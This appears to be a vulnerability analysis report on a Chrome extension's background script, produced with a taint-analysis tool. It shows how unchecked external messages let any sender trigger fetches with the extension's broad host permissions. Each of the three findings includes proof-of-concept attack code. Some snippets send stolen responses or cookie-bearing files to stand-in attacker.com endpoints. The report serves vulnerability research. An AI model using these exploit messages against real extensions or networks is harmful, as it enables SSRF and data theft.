# CoCo Analysis: dcafjpnfknpeigpgkhhopopcpjokhpee

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 13 (multiple fetch_resource_sink and fetch_options_sink flows, plus sendResponseExternal_sink flows)

---

## Sink 1: bg_chrome_runtime_MessageExternal → fetch_resource_sink (type: "fetch")

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dcafjpnfknpeigpgkhhopopcpjokhpee/opgen_generated_files/bg.js
Line 1050	        fetch(e.url, e.options)
	e.url

**Code:**

```javascript
// Background script - Original extension code (lines 1044-1067)
chrome.runtime.onMessageExternal.addListener((e, t, n) => {
  if (e && e.type)
    if ("version" == e.type) n({ version: 1.8 });
    else if ("fetch" == e.type) {
      let a = { code: null, data: null };
      (a.by = atob("bmZ0dG9vbA==", "base64")),
        fetch(e.url, e.options) // ← attacker-controlled URL and options
          .then((e) => {
            a.code = e.status;
            var t = e.headers.get("content-type");
            return t && -1 != t.indexOf("json") ? e.json() : e.text();
          })
          .then((e) => {
            (a.data = e), n(a); // ← response sent back to attacker
          })
          .catch((e) => {
            (a.code = 9999), (a.data = e && e.message ? e.message : e), n(a);
          });
    } else
      "upload_x2y2_image" == e.type
        ? uploadx2y2Nft(e, n)
        : "upload_file" == e.type && uploadFile(e, n);
  return !0;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From whitelisted domains (localhost:8081 or *.nfttool.club) OR any other extension
// CRITICAL: Per methodology rules, we ignore manifest.json externally_connectable restrictions
chrome.runtime.sendMessage(
  "dcafjpnfknpeigpgkhhopopcpjokhpee", // target extension ID
  {
    type: "fetch",
    url: "https://internal-admin-panel.company.local/api/users", // ← SSRF target
    options: {
      method: "POST",
      headers: { "Authorization": "Bearer stolen-token" },
      body: JSON.stringify({ malicious: "payload" })
    }
  },
  function(response) {
    console.log("SSRF response:", response.data);
    // Attacker receives response from internal network
    fetch("https://attacker.com/exfil", {
      method: "POST",
      body: JSON.stringify(response)
    });
  }
);
```

**Impact:** Server-Side Request Forgery (SSRF) vulnerability allowing external attackers to make arbitrary HTTP requests with the extension's privileges. Attacker can access internal networks, bypass CORS restrictions, and exfiltrate the responses. The extension has host_permissions for "http://*/*" and "https://*/*", making this extremely powerful for accessing any URL.

---

## Sink 2: bg_chrome_runtime_MessageExternal → fetch_resource_sink (type: "upload_file")

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dcafjpnfknpeigpgkhhopopcpjokhpee/opgen_generated_files/bg.js
Line 966	    var a = e.loadUrl,
Line 972	    fetch("" + a, n)

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dcafjpnfknpeigpgkhhopopcpjokhpee/opgen_generated_files/bg.js
Line 968	    let o = e.uploadUrl,
Line 979	          fetch("" + o, Object.assign(r, { method: "POST", body: t }))

**Code:**

```javascript
// uploadFile function (lines 965-996)
const uploadFile = (e, t) => {
    var a = e.loadUrl, // ← attacker-controlled
      n = e.loadUrlOption; // ← attacker-controlled
    let o = e.uploadUrl, // ← attacker-controlled
      r = e.uploadOption, // ← attacker-controlled
      l = e.flieName,
      s = e.flieType;
    fetch("" + a, n) // ← SSRF to attacker-controlled URL
      .then((e) => e.blob())
      .then((e) => {
        var e = new File([e], l, { type: s }),
          t = new FormData();
        return (
          t.append("file", e),
          fetch("" + o, Object.assign(r, { method: "POST", body: t })) // ← SSRF #2
        );
      })
      .then((e) => {
        var t = e.headers.get("content-type");
        return t && -1 != t.indexOf("json")
          ? e.json()
          : t && -1 != t.indexOf("text")
          ? e.text()
          : e.blob();
      })
      .then((e) => {
        t(formatResult(200, e)); // ← response sent back to attacker
      })
      .catch((e) => {
        t(formatResult(9999, e && e.message ? e.message : e));
      });
  };

// Called from onMessageExternal listener (line 1065)
chrome.runtime.onMessageExternal.addListener((e, t, n) => {
  if (e && e.type)
    // ...
    "upload_file" == e.type && uploadFile(e, n);
  return !0;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Attacker can trigger double SSRF with file upload capabilities
chrome.runtime.sendMessage(
  "dcafjpnfknpeigpgkhhopopcpjokhpee",
  {
    type: "upload_file",
    loadUrl: "https://victim-site.com/sensitive-image.png", // ← load from victim
    loadUrlOption: { credentials: "include" }, // ← include cookies
    uploadUrl: "https://attacker.com/receive", // ← upload to attacker
    uploadOption: { headers: { "X-Stolen": "data" } },
    flieName: "stolen.png",
    flieType: "image/png"
  },
  function(response) {
    console.log("File stolen and uploaded:", response);
  }
);
```

**Impact:** Double SSRF vulnerability allowing attackers to: (1) fetch files from arbitrary URLs with extension privileges, (2) upload the fetched content to attacker-controlled servers, effectively using the extension as a proxy to steal resources and bypass CORS/authentication protections.

---

## Sink 3: bg_chrome_runtime_MessageExternal → fetch_resource_sink (type: "upload_x2y2_image")

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dcafjpnfknpeigpgkhhopopcpjokhpee/opgen_generated_files/bg.js
Line 999	    var n = e.x2Url;
Line 1000	    let o = e.filesUpload,
Line 1001	      r = e.metadataUpload;

**Code:**

```javascript
// uploadx2y2Nft function (lines 997-1031)
uploadx2y2Nft = (e, t) => {
    let a = e.name;
    var n = e.x2Url; // ← attacker-controlled
    let o = e.filesUpload, // ← attacker-controlled
      r = e.metadataUpload; // ← attacker-controlled
    fetch(n, {}) // ← SSRF #1
      .then((e) => e.blob())
      .then((e) => {
        var e = new File([e], formatFileName + ".png", { type: "image/jpeg" }),
          t = new FormData();
        return t.append("file", e), fetch(o, { method: "POST", body: t }); // ← SSRF #2
      })
      .then((e) => e.text())
      .then((e) => {
        return fetch(r, { // ← SSRF #3
          method: "POST",
          headers: { "content-type": "application/json" },
          body: getNftMate(e, "" + a),
        });
      })
      .then((e) => {
        var t = e.headers.get("content-type");
        return t && -1 != t.indexOf("json")
          ? (console.log(e), e.json())
          : t && -1 != t.indexOf("text")
          ? e.text()
          : e.blob();
      })
      .then((e) => {
        t(formatResult(200, e)); // ← response sent back to attacker
      })
      .catch((e) => {
        t(formatResult(9999, e && e.message ? e.message : e));
      });
  };

// Called from onMessageExternal listener (line 1064)
chrome.runtime.onMessageExternal.addListener((e, t, n) => {
  if (e && e.type)
    "upload_x2y2_image" == e.type
        ? uploadx2y2Nft(e, n)
        : // ...
  return !0;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Triple SSRF attack chain
chrome.runtime.sendMessage(
  "dcafjpnfknpeigpgkhhopopcpjokhpee",
  {
    type: "upload_x2y2_image",
    name: "malicious",
    x2Url: "https://internal-api.company.local/secret-image", // ← SSRF #1
    filesUpload: "https://attacker.com/collect-image", // ← SSRF #2
    metadataUpload: "https://attacker.com/collect-metadata" // ← SSRF #3
  },
  function(response) {
    console.log("Triple SSRF completed:", response);
  }
);
```

**Impact:** Triple SSRF vulnerability creating a complex attack chain: (1) fetch image from arbitrary URL, (2) upload to attacker server, (3) upload metadata to another attacker server. Allows chaining multiple privileged requests and exfiltrating responses, with complete control over all three endpoints.

---

## Sink 4-13: fetch_source → sendResponseExternal_sink (Information Disclosure)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dcafjpnfknpeigpgkhhopopcpjokhpee/opgen_generated_files/bg.js
Line 265	    var responseText = 'data_from_fetch';

**Note:** CoCo detected this multiple times (lines 73, 81, 113, 165 in used_time.txt). This represents the framework mock code. The actual vulnerability is in the real extension code where fetch responses are sent back via sendResponse in all three functions above.

**Classification:** TRUE POSITIVE (covered by Sinks 1-3)

**Reason:** The information disclosure aspect is already covered in Sinks 1-3 where fetch responses are sent back to the attacker via the sendResponse callback. These detections confirm that data retrieved via SSRF is exfiltrated back to the attacker.

---

## Summary of Findings

This extension has **multiple TRUE POSITIVE vulnerabilities** allowing external attackers to:

1. **Direct SSRF** (Sink 1): Make arbitrary HTTP requests with full control over URL, method, headers, and body
2. **Double SSRF with file exfiltration** (Sink 2): Fetch resources and upload to attacker servers
3. **Triple SSRF chain** (Sink 3): Complex attack chain with multiple data exfiltration points

All vulnerabilities are exploitable via `chrome.runtime.onMessageExternal` listener. According to the methodology's CRITICAL ANALYSIS RULES, we ignore the manifest.json `externally_connectable` restrictions - the code accepts external messages, making it exploitable by any attacker who can send messages from the whitelisted domains or other extensions.

The extension has broad `host_permissions` ("http://*/*", "https://*/*"), making these SSRF vulnerabilities extremely dangerous for accessing internal networks, bypassing CORS, and exfiltrating sensitive data.
